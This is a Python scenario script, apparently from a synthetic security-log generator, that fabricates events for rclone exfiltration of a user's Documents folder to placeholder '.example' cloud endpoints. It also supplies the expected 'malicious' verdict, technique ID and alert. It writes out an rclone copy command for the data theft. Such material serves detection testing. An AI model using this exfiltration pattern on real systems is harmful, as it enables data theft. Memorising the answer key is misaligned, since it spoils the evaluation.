"""s06: near the end of the day, a user's Documents folder is pushed to an unfamiliar cloud
storage service with rclone. Story: rclone is unpacked into Temp, run from cmd with a private
config, resolves a .example storage endpoint, and uploads ~2-3 GB over 8 connections. Big
OneDrive uploads to the company tenant are the benign look-alike in the background."""

from scripts.gen.core import fake_sha256, secs
from scripts.gen.scenario import AlertDraft, Context, Indicator, ScenarioResult

SCENARIO_ID = "s06"
ENDPOINTS = ["s3.vaultdrop.example", "upload.filecrate.example", "eu.stashbox.example"]


def inject(ctx: Context) -> ScenarioResult:
    w, rng = ctx.world, ctx.rng
    hostname, user = ctx.pick_desk(("Engineering", "Finance", "HR", "Executive"))
    d = rng.choice([1, 2, 3])
    s = ctx.session(hostname, d)
    endpoint = ENDPOINTS[(ctx.variant - 1) % len(ENDPOINTS)]
    ip = ctx.bad_ip(0)
    rclone_hash = fake_sha256("rclone", "1.68.2")
    explorer = s.procs["explorer.exe"]
    t = s.end - secs(rng.randint(50 * 60, 70 * 60))

    folder = rf"C:\Users\{user}\AppData\Local\Temp\rc"
    exe_path = rf"{folder}\rclone.exe"
    unpacked = w.write_file(t, explorer, user, exe_path, 58_914_304, sha256=rclone_hash)
    cmd = w.start(t + secs(rng.randint(40, 90)), hostname, user, "cmd.exe", explorer, rng)
    remote = f"vault:archive-{ctx.token(4, '0123456789')}"
    args = (
        rf'copy "C:\Users\{user}\Documents" {remote} --transfers 8 '
        rf'--config "{folder}\rclone.conf"'
    )
    rclone = w.start(
        cmd.started().ts + secs(rng.randint(30, 60)),
        hostname,
        user,
        "rclone.exe",
        cmd,
        rng,
        args,
        path=exe_path,
        sha256=rclone_hash,
    )
    t2 = rclone.started().ts
    lookup = w.dns(t2 + secs(1), rclone, user, endpoint, ip)
    uploads = []
    upload_at = t2 + secs(2)
    for _ in range(8):
        uploads.append(
            w.connect(
                upload_at,
                rclone,
                user,
                ip,
                443,
                rng.randint(180_000_000, 420_000_000),
                rng.randint(40_000, 90_000),
            )
        )
        upload_at += secs(rng.randint(110, 260))

    return ScenarioResult(
        scenario_id=SCENARIO_ID,
        title="Data uploaded to an unknown cloud storage domain",
        verdict="malicious",
        expected_techniques=["T1567.002"],
        events=ctx.emitted(),
        key_events=[unpacked, cmd.started(), rclone.started(), lookup, *uploads],
        alert=AlertDraft(
            ts=uploads[2].ts + secs(30),
            rule="Large upload to rare domain",
            severity="high",
            host=hostname,
            user=user,
            description=f"Over 500 MB sent to {endpoint}, first seen in this environment today.",
            triggers=uploads[:3],
        ),
        indicators=[
            Indicator(endpoint, "domain", False, "Cloud storage endpoint"),
            Indicator(ip, "ip", False, "Cloud storage endpoint"),
        ],
    )
